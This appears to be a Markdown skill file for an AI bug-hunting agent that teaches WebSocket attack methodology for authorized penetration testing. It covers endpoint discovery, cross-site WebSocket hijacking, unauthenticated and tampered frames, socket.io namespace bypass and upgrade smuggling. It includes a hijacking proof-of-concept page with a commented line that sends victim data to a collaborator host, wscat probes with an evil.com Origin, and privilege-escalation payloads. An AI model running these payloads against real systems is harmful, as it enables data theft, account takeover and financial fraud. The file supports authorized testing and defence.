---
name: hunt-websocket
description: Hunt WebSocket vulnerabilities
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: hackerone_public, portswigger_research, cve
report_count: 11
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

# HUNT-WEBSOCKET — WebSocket Security

## Crown Jewel Targets

CSWSH (Cross-Site WebSocket Hijacking) with a cookie-authenticated handshake and no CSRF/per-connection token = High–Critical (real-time exfil of any logged-in victim's data).

**Highest-value chains:**
- **CSWSH → data exfil / ATO** — handshake authenticates via ambient cookie, no CSRF token, Origin not enforced → attacker page opens WS as the victim and streams their messages/PII/tokens. If the stream carries a session/refresh/CSRF token, this escalates to ATO.
- **No per-message auth** — HTTP/handshake auth present but individual WS frames are not re-authorized → privileged messages accepted (`deleteUser`, `getSecretConfig`).
- **Message tampering** — modify in-flight frames (price, qty, userId, amount) in trading/game/checkout apps → financial fraud.
- **socket.io namespace / room authz bypass** — connect to a privileged namespace or join another user's room without a permission check → cross-tenant real-time exfil.
- **Handshake-layer Upgrade smuggling** — a malformed `Upgrade`/`Connection`/`Sec-WebSocket-*` handshake makes the front proxy and origin disagree on whether an upgrade occurred → request-smuggling tunnel.

---

## Grounding — Reference Cases (read before hunting)

These are public, verifiable references. Use them to calibrate what a *real* WS finding looks like and how it was proven. Do not invent additional report IDs or payouts.

| # | Source / ID | Class | Lesson |
|---|-------------|-------|--------|
| 1 | PortSwigger Web Security Academy — "Cross-site WebSocket hijacking" (research + labs) | CSWSH | Canonical CSWSH model: cookie-auth handshake + no CSRF token + missing Origin check → attacker reads/sends as victim. The authoritative methodology. |
| 2 | Christian Schneider — "Cross-Site WebSocket Hijacking (CSWSH)" (original disclosure/write-up, 2013) | CSWSH | First public CSWSH technique: cookie-auth handshake + no Origin enforcement; PoC must prove victim-data receipt in the attacker browser, not just a 101. |
| 3 | Coda CSWSH (referenced in this repo's hunt-csrf set) | CSWSH | Real-time collab apps commonly authenticate the socket purely via cookie; Origin allow-listing was the missing control. |
| 4 | CVE-2020-7662 — `websocket-extensions` (Node) ReDoS | DoS | A crafted `Sec-WebSocket-Extensions` header triggers catastrophic backtracking — handshake header is an attack surface, not just frames. |
| 5 | CVE-2024-37890 — `ws` (Node) DoS | DoS | Many handshake request headers exhaust the server; confirms the handshake itself is parser-attackable pre-frames. |
| 6 | Outdated `socket.io` / Engine.IO stacks | socket.io | Motivates the version-fingerprint step in Phase 7 — fingerprint the version, then check that release's known advisories. |

> Only the four CVEs above are asserted with exact IDs because they are verifiable. For any case where you are not certain of the exact identifier, describe the technique with **no** citation — a wrong CVE is worse than none.

---

## Phase 1 — Discover WebSocket Endpoints

```bash
# Grep JS for WS connections (handshake URLs, socket.io clients)
grep -rE "new WebSocket|io\(|io\.connect|socket\.io|new SockJS|signalr|Phoenix\.Socket|wss?://" \
  recon/$TARGET/ --include="*.js" 2>/dev/null | \
  grep -oE "(wss?://[^'\"]+|/[a-zA-Z0-9/_.-]*socket[^'\"]*|/signalr[^'\"]*|/cable\b)" | sort -u

# Crawl URLs for realtime hints
grep -iE "socket|/ws\b|websocket|stream|realtime|live|chat|events|/cable|/signalr|notifications" \
  recon/$TARGET/urls.txt | sort -u

# Probe handshake (101 = upgrade supported)
curl -sI -o /dev/null -w "%{http_code}\n" \
  -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: $(head -c16 /dev/urandom | base64)" \
  "https://$TARGET/ws"

# socket.io polling handshake leaks version + sid
curl -s "https://$TARGET/socket.io/?EIO=4&transport=polling" | head -c 300; echo

# Non-standard WS ports
nmap -sV -p 80,443,3000,3001,8080,8443,8888,9000 $TARGET 2>/dev/null | grep open
```

In Burp Pro, use `get_proxy_websocket_history` (and the WebSockets tab) after browsing the app to enumerate live sockets, message schemas, and which frames carry auth-sensitive data.

---

## Phase 2 — CSWSH (Cross-Site WebSocket Hijacking)

CSWSH requires THREE conditions together: (a) the handshake authenticates via an **ambient credential** (cookie sent automatically), (b) there is **no unpredictable per-connection token** in the handshake (no CSRF token / no token in URL/body), and (c) the server **does not enforce Origin**. Missing any one breaks the attack.

```bash
# Step 1 — Confirm handshake auth model in DevTools → Network → WS → Headers.
#   Look for: Cookie: session=...  AND  the ABSENCE of any per-request token
#   (no ?token=, no Sec-WebSocket-Protocol carrying a bearer, no body nonce).
#   If a unique token rides the handshake, CSWSH is NOT exploitable cross-site.

# Step 2 — Probe Origin enforcement (this is a SIGNAL, not a confirmation)
wscat -c "wss://$TARGET/ws" \
  --header "Origin: https://evil.com" \
  --header "Cookie: session=YOUR_SESSION"
# A 101 from a foreign Origin only proves the handshake opened.
# It does NOT confirm CSWSH — the server may still validate Origin at the
# message layer, refuse to stream authenticated data, or require a token
# in the first app-level frame. Treat 101 as "candidate", move to Step 3.
```

```html
<!-- Step 3 — Real PoC: host on attacker origin, open while a SEPARATE victim
     account is logged into TARGET in the same browser. The bug is only
     confirmed if attacker JS RECEIVES the victim's data (or successfully
     sends a privileged frame). Cross-origin JS cannot set Origin/Cookie —
     the browser does, which is exactly the threat model. -->
<html><body><pre id="out"></pre><script>
var marker = "CSWSH-" + Math.random().toString(36).slice(2);   // unique per run
var ws = new WebSocket("wss://TARGET/ws");                     // attacker cannot forge Origin
ws.onopen = () => {
  log("[+] 101 opened from attacker origin");
  ws.send(JSON.stringify({type:"subscribe", channel:"user_notifications", _m:marker}));
};
ws.onmessage = e => {
  log("VICTIM-DATA: " + e.data);
  // Exfil PROOF to your Collaborator/listener so receipt is logged out-of-band:
  // navigator.sendBeacon("https://<collab-id>.oastify.com/cswsh?d=" + encodeURIComponent(e.data));
};
ws.onerror = e => log("ERR (likely Origin/auth rejected at message layer)");
function log(s){document.getElementById("out").textContent += s + "\n";}
</script></body></html>
```

**False-positive killers:**
- A completed `101` from `Origin: evil.com` is NOT a finding. Many servers accept the upgrade and then send nothing, or close on the first authenticated frame.
- Verify the data you receive belongs to a **different account** than the attacker, using a unique marker / distinct victim PII you planted in account B.
- Exfil the received payload to **Burp Collaborator / an OAST listener** so receipt is recorded out-of-band — this is your impact proof for the report.
- If a per-connection token rides the handshake (in the URL, a sub-protocol, or the first frame), CSWSH is **not** cross-site exploitable; downgrade or drop.

---

## Phase 3 — Missing / Weak Authentication on WS Messages

Handshake auth ≠ per-message auth. Apps often authenticate the socket once, then trust every subsequent frame.

```bash
# No cookie at all — does the server process app frames?
wscat -c "wss://$TARGET/ws"
# > {"type":"getUserData","userId":1}
# > {"type":"getAdminPanel"}

# Low-priv session sending high-priv actions
wscat -c "wss://$TARGET/ws" --header "Cookie: session=LOW_PRIV_SESSION"
# > {"action":"deleteUser","userId":999}
# > {"action":"getSecretConfig"}
```

**Validate:** the privileged action must produce a real effect (a deleted test user, returned secret config, a state change visible via a second channel) — a frame that is *accepted and silently ignored* is not a finding. Re-run as an unauthenticated client to confirm the action is not simply broadcast to everyone harmlessly.

### Replay of Signed Messages
If messages carry signatures (e.g., `{"type":"payment","amount":100,"signature":"..."}`), test replay for freshness and session binding. Capture a signed message and test: (a) **time-window bypass**: replay the message after its expiry timestamp (clock skew/validation gap), (b) **session bypass**: capture a signed message from user A's session and replay it in user B's session — if accepted, the signature was not bound to the user/session ID. Use Burp Repeater to store and replay signed frames, or reconstruct the same message in `wscat` after a time window has passed.

### Business Logic Abuse: State Machine Bypass & Rate Limit Evasion
Stateful protocols (e.g., a trading platform expecting `connect → authenticate → verify_balance → place_order`) may accept messages out of order or skip prerequisites. Test: (a) **state skip**: connect and immediately send `place_order` without `authenticate` or `verify_balance` first — many stacks don't enforce strict ordering if individual message validation is missing, (b) **high-frequency spam**: send identical or high-volume messages rapidly to bypass WS-layer rate limits (different from HTTP rate limits) — test 100s of messages/second to see if the server throttles, returns 429, or closes the connection. If it accepts and processes all, this can abuse business logic (e.g., many small payments to bypass amount caps, or rapid subscriptions to exhaust resources).

---

## Phase 4 — Message Tampering (Financial / Game / Checkout)

```bash
# Intercept + edit in Burp (Proxy → WebSockets history → right-click → Send to
# Repeater, or edit-and-forward). Try server-trusted client values:
#   {"price":100}      -> {"price":0.01}
#   {"amount":1}       -> {"amount":9999}
#   {"userId":123}     -> {"userId":1}        # impersonate admin
#   {"orderTotal":...} -> recompute downstream?

# wscat replay of a tampered frame
wscat -c "wss://$TARGET/trade" --header "Cookie: session=SESSION"
# > {"action":"buy","amount":1,"price":0.01}
```

**Validate:** the tampered value must persist server-side — confirm via the REST/order API or a fresh socket that the order/balance/price actually reflects the manipulation. Many UIs echo your own frame back optimistically; that echo is NOT proof. Demonstrate financial/state impact, ideally on a sandbox/test instrument.

---

## Phase 5 — socket.io / SignalR / Phoenix Namespace & Room Authz Bypass

Engine.IO/socket.io is a protocol layered over the raw WebSocket. Packet prefixes (Engine.IO `4`=MESSAGE wrapping socket.io `0`=CONNECT, `1`=DISCONNECT, `2`=EVENT) carry namespace/room intent. Authorization must be checked when joining; often it isn't.

```bash
# 1) Open the raw socket.io WebSocket (Engine.IO v4)
wscat -c "wss://$TARGET/socket.io/?EIO=4&transport=websocket" \
  --header "Cookie: session=YOUR_SESSION"

# 2) Respond to the server's Engine.IO OPEN ('0{...}') so the connection lives,
#    then CONNECT to a namespace with a socket.io CONNECT packet.
#    CORRECT packet to join the /admin namespace:  40/admin,
#       4 = Engine.IO MESSAGE,  0 = socket.io CONNECT,  /admin, = namespace
#    (NOT a ?nsp= query param — see Phase 7. NOT 42 — 42 is MESSAGE+EVENT.)
# > 40/admin,
#    Server replies 40/admin,{"sid":"..."} on success, or 44/admin,{...} (error)
#    on rejection. A 40 success to a privileged namespace as a low/no-priv
#    user is the bug.

# 3) Once in a namespace, emit an EVENT (42) to join another user's room:
# > 42/admin,["join",{"room":"user_999_private"}]
# > 42["subscribe",{"channel":"admin_events"}]      # root namespace
#    Watch for 42 EVENT frames carrying ANOTHER user's data.
```

**Validate:** distinguish *connected to namespace* from *received privileged data*. The finding is confirmed only when you receive `42` event frames containing data belonging to a different tenant/user, or a privileged emit produces a verifiable server-side effect. A `40/admin` ack with no subsequent data may just be an open-but-empty namespace.

> SignalR analogue: negotiate at `/<hub>/negotiate`, then connect and `Invoke`/`Send` hub methods — test method-level authorization. Phoenix Channels: `phx_join` to `topic:subtopic` and check whether the server's `join/3` authorizes the topic.

---

## Phase 6 — Handshake-Layer Upgrade Smuggling (NOT frame smuggling)

Important: once a WebSocket is established, your payloads are wrapped in WS frames and are **never re-parsed as HTTP** by the proxy. Typing `GET /admin HTTP/1.1` into an open `wscat` session does nothing. WebSocket-related smuggling lives at the **handshake**, before any frames exist.

The real technique: send a WebSocket Upgrade request that the **front proxy** and the **origin** interpret differently — e.g. a bad `Sec-WebSocket-Version` that makes the origin reply `426 Upgrade Required` (or `400`) while the proxy has already decided the connection is "upgraded" and stops parsing HTTP. The proxy then tunnels subsequent bytes straight to the origin as an opaque stream, letting you smuggle arbitrary HTTP requests past front-end controls (WAF/authz).

```bash
# Detection is HTTP-layer, not frame-layer. Use Burp Repeater / send_http1_request
# and toggle ONE handshake variable at a time, comparing front-vs-origin behavior:

#  A) Valid-looking upgrade but unsupported version:
#     Upgrade: websocket
#     Connection: Upgrade
#     Sec-WebSocket-Version: 777          <- origin should 426; does the proxy still tunnel?
#     Sec-WebSocket-Key: <16-byte base64>

#  B) Upgrade header present but Connection: keep-alive (mismatch)
#  C) Smuggled second request body after a "successful" 101, then send a normal
#     follow-up request on the same connection and watch for a desynced response.
```

Drive this with Burp Pro's **HTTP Request Smuggler** extension (it has WebSocket-upgrade test cases) rather than by hand. **Validate** exactly like classic smuggling: prove desync via a timing/differential probe AND show real impact (reach an internal/forbidden path, poison a cached response, or capture another user's request) — confirmed against **Burp Collaborator / OAST**, never on a single ambiguous response.

---

## Phase 7 — socket.io / Engine.IO Specifics

```bash
# Version + initial sid (handshake JSON after the leading Engine.IO digit)
curl -s "https://$TARGET/socket.io/?EIO=4&transport=polling" | head -c 300; echo
# Old/EOL socket.io stacks have known issues — fingerprint the version, then check that release's advisories;
# fingerprint the client lib version from JS bundles too.

# Namespace selection is a PROTOCOL message, not a URL param.
#   WRONG:  wscat -c "wss://$TARGET/socket.io/?EIO=4&transport=websocket&nsp=/admin"
#           ^ `nsp` is NOT a recognized socket.io query param. It is silently
#             ignored and you connect to the ROOT namespace "/". You will believe
#             you tested /admin when you did not.
#   RIGHT:  open the socket, then send the CONNECT packet  40/admin,  (Phase 5).

# Forged/replayed sid against the polling transport (session fixation / hijack probe)
curl -s "https://$TARGET/socket.io/?EIO=4&transport=polling&sid=FAKE_OR_VICTIM_SID"
#   400 "Session ID unknown" = good. A 200 that resumes another sid's stream = bug.
```

---

## Tools

```bash
npm install -g wscat                 # CLI WS client (raw + socket.io)
brew install websocat                # alt client; supports text/binary + autoreconnect
# Burp Suite Pro: WebSockets history (intercept/edit/replay), HTTP Request
#   Smuggler extension (handshake-upgrade smuggling), Collaborator for OAST proof.
# Burp MCP: get_proxy_websocket_history / get_proxy_websocket_history_regex to
#   enumerate frames; generate_collaborator_payload + get_collaborator_interactions
#   to prove out-of-band receipt from a CSWSH/smuggling PoC.
```

---

## Chain Table

| WS finding | Chain to | Impact |
|-----------|----------|--------|
| CSWSH + token in stream | Steal session/refresh/CSRF token from victim frames | ATO (Critical) |
| CSWSH confirmed | Subscribe to victim channels, exfil to OAST | Real-time data theft (High) |
| No per-message auth | Send admin/privileged frames | Privilege escalation (Critical) |
| Message tampering | Modify price/amount/userId, confirm server-side | Financial fraud (Critical) |
| Namespace/room authz bypass | Join other tenant's room, read `42` events | Cross-tenant exfil (High) |
| Handshake Upgrade smuggling | Tunnel HTTP past WAF/authz, OAST-confirmed | Smuggling → SSRF/cache poison (High–Critical) |

---

## Validation (mandatory before reporting)

- ✅ **CSWSH:** attacker-origin PoC HTML, opened with a *different* victim account logged in, must **receive that victim's data** (verified by a unique planted marker / distinct PII) and exfil it to **Collaborator/OAST**. A bare `101` from a foreign Origin is NOT a finding.
- ✅ **No per-message auth:** privileged frame produces a **verifiable server-side effect** (state change confirmed via a second channel / REST API), not merely "accepted".
- ✅ **Message tampering:** tampered value **persists server-side** (confirmed via order/balance API), not just echoed in the UI.
- ✅ **Namespace/room bypass:** received **`42` event frames with another user's data**, not just a `40` namespace ack.
- ✅ **Upgrade smuggling:** desync proven by timing/differential probe **and** real-world impact, **OAST-confirmed**. No single-response guesses.
- ❌ Reject: a 101 alone, an accepted-but-ignored frame, a self-echoed message, a connected-but-empty namespace, or any "confirmed" claim lacking out-of-band/cross-account proof.

**Severity:**
- CSWSH leaking session/refresh token → ATO: **Critical**
- CSWSH → real-time session-data theft: **High**
- No auth on admin/privileged WS actions: **Critical**
- Financial message tampering (server-confirmed): **Critical**
- Namespace/room subscription bypass (cross-tenant): **High**

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
